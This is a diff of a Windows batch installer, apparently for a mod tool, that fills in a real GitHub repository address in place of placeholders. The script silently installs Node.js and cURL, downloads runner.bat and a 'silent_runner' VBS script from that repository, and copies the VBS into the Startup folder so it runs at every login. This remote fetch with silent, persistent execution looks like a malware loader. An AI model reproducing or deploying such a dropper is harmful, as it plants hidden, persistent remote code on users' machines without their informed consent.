@@ -12,10 +12,10 @@ where node >nul 2>nul || winget install --id OpenJS.NodeJS -e --silent
 where curl >nul 2>nul || winget install --id cURL.cURL -e --silent
 
 :: Download runner.bat from GitHub
-curl -L -o "%appdata%\dsmodinstaller\runner.bat" "https://raw.githubusercontent.com/YOUR_GITHUB_RAW_URL/runner.bat" || bitsadmin /transfer job /download /priority high "https://raw.githubusercontent.com/YOUR_GITHUB_RAW_URL/runner.bat" "%appdata%\dsmodinstaller\runner.bat"
+curl -L -o "%appdata%\dsmodinstaller\runner.bat" "https://raw.githubusercontent.com/6686-repos/DsModInstallerFiles/refs/heads/main/runner.bat" || bitsadmin /transfer job /download /priority high "https://raw.githubusercontent.com/6686-repos/DsModInstallerFiles/refs/heads/main/runner.bat" "%appdata%\dsmodinstaller\runner.bat"
 
 :: Download silent_runner.vbs from GitHub
-curl -L -o "%appdata%\dsmodinstaller\silent_runner.vbs" "https://raw.githubusercontent.com/YOUR_GITHUB_RAW_URL/silent_runner.vbs" || bitsadmin /transfer job /download /priority high "https://raw.githubusercontent.com/YOUR_GITHUB_RAW_URL/silent_runner.vbs" "%appdata%\dsmodinstaller\silent_runner.vbs"
+curl -L -o "%appdata%\dsmodinstaller\silent_runner.vbs" "https://raw.githubusercontent.com/6686-repos/DsModInstallerFiles/refs/heads/main/silent_runner.vbs" || bitsadmin /transfer job /download /priority high "https://raw.githubusercontent.com/6686-repos/DsModInstallerFiles/refs/heads/main/silent_runner.vbs" "%appdata%\dsmodinstaller\silent_runner.vbs"
 
 :: Copy silent script to Startup folder
 copy "%appdata%\dsmodinstaller\silent_runner.vbs" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\" >nul
